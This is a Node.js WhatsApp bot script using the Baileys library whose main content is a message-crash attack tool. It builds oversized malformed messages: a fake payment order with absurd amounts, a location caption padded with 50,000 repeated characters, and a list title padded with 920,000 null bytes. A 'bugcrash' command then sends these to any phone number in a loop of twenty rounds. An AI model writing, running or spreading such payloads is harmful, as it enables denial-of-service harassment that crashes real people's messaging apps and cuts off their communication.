require('./Database/setting')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeCacheableSignalKeyStore } = require("@whiskeysockets/baileys")

const fs = require('fs')
const jimp = require('jimp')
const axios = require('axios')
const chalk = require('chalk')
const crypto = require('crypto')
const moment = require('moment-timezone')
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, sleep } = require('./Database/myfunction');

module.exports = sock = async (sock, m, chatUpdate, store) => {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')

const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!™©®Δ^βα¦|/\\©^]/gi) : '.'

const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const NumberId = await sock.decodeJid(sock.user.id)
const itsMe = m.sender == NumberId ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const { chats } = m
const qmsg = (quoted.msg || quoted)

sock.sendText = (jid, text, quoted = '', options) => sock.sendMessage(jid, { text: text, ...options }, { quoted })

const bugLinsYt = {
  key: {
    participant: `0@s.whatsapp.net`,
    ...(m.chat ? {
      remoteJid: "status@broadcast"
    } : {})
  },
  'message': {
    "interactiveMessage": {
      "header": {
        "hasMediaAttachment": true,
        "jpegThumbnail": fs.readFileSync(`./Database/lins.png`)
      },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "review_and_pay",
            "buttonParamsJson": `{
              "currency": "IDR",
              "total_amount": {
                "value": 4949494944949494949494,
                "offset": 100
              },
              "reference_id": "4OON4PX3FFJ",
              "type": "physical-goods",
              "order": {
                "status": "payment_requested",
                "subtotal": {
                  "value": 49069994400,
                  "offset": 100
                },
                "tax": {
                  "value": 490699944,
                  "offset": 100
                },
                "discount": {
                  "value": 485792999999,
                  "offset": 100
                },
                "shipping": {
                  "value": 48999999900,
                  "offset": 100
                },
                "order_type": "ORDER",
                "items": [
                  {
                    "retailer_id": "7842674605763435",
                    "product_id": "7842674605763435",
                    "name": "✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp",
                    "amount": {
                      "value": 9999900,
                      "offset": 100
                    },
                    "quantity": 7
                  },
                  {
                    "retailer_id": "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8",
                    "name": "",
                    "amount": {
                      "value": 999999900,
                      "offset": 100
                    },
                    "quantity": 49
                  }
                ],
                "native_payment_methods": []
              }
            }`
          }
        ]
      }
    }
  }
};

async function bugJaa(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      "liveLocationMessage": {
        "degreesLatitude": "-2,97607",
        "degreesLongitude": "104,77543",
        "caption": '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
        "sequenceNumber": "0",
        "jpegThumbnail": ""
         }
      }
    }
}), { userJid: target, quoted: bugLinsYt })
await sock.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function bugList(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await sock.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function aipong(target) {
await sock.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

switch (command) { 
case 'buginfinity': case 'bugcrash': case 'bugfatal': { 
if (!text) return m.reply(`Example : ${command} 628×××`)
let target = text + '@s.whatsapp.net'
for (let j = 0; j < 20; j++) { 
await bugJaa(target)
await bugList(target)
await bugJaa(target)
await bugJaa(target)
await bugList(target)
await sleep(2000)
  } m.reply(mess.SuccesBug)
 }
break

default:
 }
}